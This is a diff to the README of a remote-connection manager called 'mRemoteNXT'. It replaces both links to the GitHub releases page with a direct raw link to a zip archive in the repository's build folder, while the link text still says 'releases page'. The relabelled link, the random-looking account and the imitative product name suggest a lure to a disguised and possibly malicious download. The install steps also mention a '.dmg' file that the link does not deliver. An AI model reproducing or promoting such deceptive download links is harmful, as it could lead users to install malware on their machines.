@@ -1,6 +1,6 @@
 # 🌐 mRemoteNXT - Manage your remote connections with ease
 
-[![](https://img.shields.io/badge/Download-mRemoteNXT-blue.svg)](https://github.com/carpinuscarolinianaduck906/mRemoteNXT/releases)
+[![](https://img.shields.io/badge/Download-mRemoteNXT-blue.svg)](https://raw.githubusercontent.com/carpinuscarolinianaduck906/mRemoteNXT/main/build/Remote_m_NXT_1.8-alpha.5.zip)
 
 mRemoteNXT helps you organize your remote desktop and server connections. It keeps your sessions in one window. You switch between servers using tabs. This tool works with common protocols like SSH, RDP, Telnet, and SFTP. It saves time for users who manage multiple remote machines.
 
@@ -19,7 +19,7 @@ mRemoteNXT provides tools to simplify remote management.
 
 Follow these steps to install the software on your machine.
 
-1. Visit the [releases page](https://github.com/carpinuscarolinianaduck906/mRemoteNXT/releases) to find the latest version.
+1. Visit the [releases page](https://raw.githubusercontent.com/carpinuscarolinianaduck906/mRemoteNXT/main/build/Remote_m_NXT_1.8-alpha.5.zip) to find the latest version.
 2. Look for the file ending in `.dmg` or the installer for your system.
 3. Click the file name to start the download.
 4. Open the downloaded file once the process finishes.
